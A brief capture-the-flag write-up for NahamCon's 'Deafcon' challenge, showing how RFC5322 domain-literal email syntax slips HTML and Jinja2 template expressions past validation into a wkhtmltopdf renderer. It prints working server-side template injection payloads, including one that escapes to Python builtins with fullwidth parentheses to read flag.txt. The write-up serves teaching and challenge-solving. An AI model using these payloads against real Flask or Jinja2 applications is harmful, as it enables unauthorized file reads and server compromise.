# Deafcon

The premise of this challenge was similar to [Hacker TS](hacker-ts.md) - we had input that was rendered into a PDF using `wkhtmltopdf`. However, our payload had to fit the following constraints:

* `name` validated for alphanumeric characters
* `email` uses RFC5322 validation

The `email` parameter is naturally more realistic to exploit, so I dived into [RFC5322](https://datatracker.ietf.org/doc/html/rfc5322#section-3.4.1) and found the part that specified the allowed characters.

```
   addr-spec       =   local-part "@" domain

   local-part      =   dot-atom / quoted-string / obs-local-part

   domain          =   dot-atom / domain-literal / obs-domain

   domain-literal  =   [CFWS] "[" *([FWS] dtext) [FWS] "]" [CFWS]

   dtext           =   %d33-90 /          ; Printable US-ASCII
                       %d94-126 /         ;  characters not including
                       obs-dtext          ;  "[", "]", or "\"
```

The `email` is made up of `<local-part`>`@<domain>`, and interestingly the `domain` allows for a `domain-literal` format - `[<any printable ASCII character>]`.&#x20;

This allows us, for example, to use the following payload:

`http://challenge.nahamcon.com:31575/ticket?name=test&email=test@[<h1>test</h1>]`

My teammate Enyei then found that this endpoint was also vulnerable to SSTI - it seems that the input is first rendered into a Jinja2 template before being passed to `wkhtmltopdf`.&#x20;

The following will render the email as `test@[49]`, for instance:

`http://challenge.nahamcon.com:31575/ticket?name=test&email=test@[{{7*7}}]`

At this point, we can craft a payload that reads the `flag.txt` file:

`http://challenge.nahamcon.com:30555/ticket?name=a&email=a@[{{%20get_flashed_messages.__globals__.__builtins__.open%EF%BC%88%22flag.txt%22%EF%BC%89.read%EF%BC%88%EF%BC%89%20}}]`
